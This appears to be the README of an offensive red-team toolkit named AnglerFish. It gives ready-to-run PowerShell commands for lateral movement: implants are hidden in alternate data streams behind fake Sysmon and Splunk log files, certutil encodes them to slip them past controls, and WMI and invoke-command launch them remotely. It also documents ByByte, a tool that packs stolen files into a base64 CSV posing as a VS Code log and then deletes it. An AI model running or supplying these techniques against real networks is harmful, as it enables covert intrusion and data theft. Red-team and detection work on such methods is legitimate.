# AnglerFish

## Lateral Movement
LoL (living-off-the-land) techniques to perform lateral movement using `esentutl` and `certutil`.

> note: Lateral movement techniques assume a .exe implant but these techniques should be easily adaptable for the use-case

* `Esentutl` with [ADS](https://attack.mitre.org/techniques/T1564/004/):
```powershell
Esentutl.exe /y <C:\path\to\implant> /d \\<remote.host>\path\on\remote\sysmon.log:<implant.exe> 

ex: usage:
esentutl.exe /y C:\users\public\implant.exe /d \\dbserver.dev.local\C:\users\public\splunk.log:implant.exe
```

* `Certutil`:
  * Encode:
     ```powershell
    certutil -encode <C:\path\to\implant.exe> <C:\dest\path\of\com.crt> | out-null

    Ex. Usage:
    certutil -encode C:\users\public\implant.exe C:\users\public\com.crt | out-null
    ```
  * Decode run on remote host (`invoke-command`, `psexec`, etc): 
    ```powershell
    invoke-command <target.hostname> -scriptblock { certutil -decode \\<localhost>\c$\users\public\com.crt <destination.path>; wmic process call create <"C:\path\to\implant> } 


    Ex. Usage:
    certutil -encode C:\users\public\implant.exe C:\users\public\com.crt | out-null
    ```
### Launching remote processes
The following methods have been tested opening remote processes on hosts as an inactive user (i.e. not logged in on remote machine). Note that this is not an exhaustive list, but a couple of methods that have been tested.

* `invoke-wmimethod`
```powershell
invoke-wmimethod -computername <target.host.IP> -class win32_process -name Create -argumentlist "<path\to\implant\splunk.log:implant.exe>"

Ex. Usage:
invoke-wmimethod -computername dbserver.dev.local -class win32_process -name Create -argumentlist "C:\users\public\implant.exe"
```
* `wmic` with ADS (run on remote host using `invoke-command` or other methods)
```powershell
wmic process call create <"C:\path\to\splunk.log:implant.exe">

Ex. Usage:
invoke-command dbserver.dev.local -scriptblock { wmic process call create "C:\users\public\splunk.log:implant.exe" }
```

## Data Exfiltration

[ByByte](./bybybte.ps1) is a provided exfiltration tool that breaks files into base64 strings stored as a CSV `mat-blk.log` in `C:\users\$env:username\appdata\roaming\code\logs\`, and reassembles them from a single file while preserving data, filename, and extension.

The intention is to simplify exfiltration from a mass of files to a single CSV which contains all the pieces needed to rebuild the files outside of the attack environment.

* `-break` : takes a filepath and breaks file into a base64 string, and store as `mat-blk.log`. It will create the log file if it doesn't exist, and otherwise append data if it does.
```powershell
bybyte.ps1 -break C:\users\vflemming\recipeResearch.xlsx
```
* `-build` : Takes a filepath that goes to the file from -build and converts all line items in the list to their file formats. Files are built and then created in `$pwd\files\`
```powershell
bybyte.ps1 -build C:\users\operator\mat-blk.log
```
* `-clean` : Deletes the `mat-blk.log` file from its default location on the current host
```powershell
bybyte.ps1 -clean
```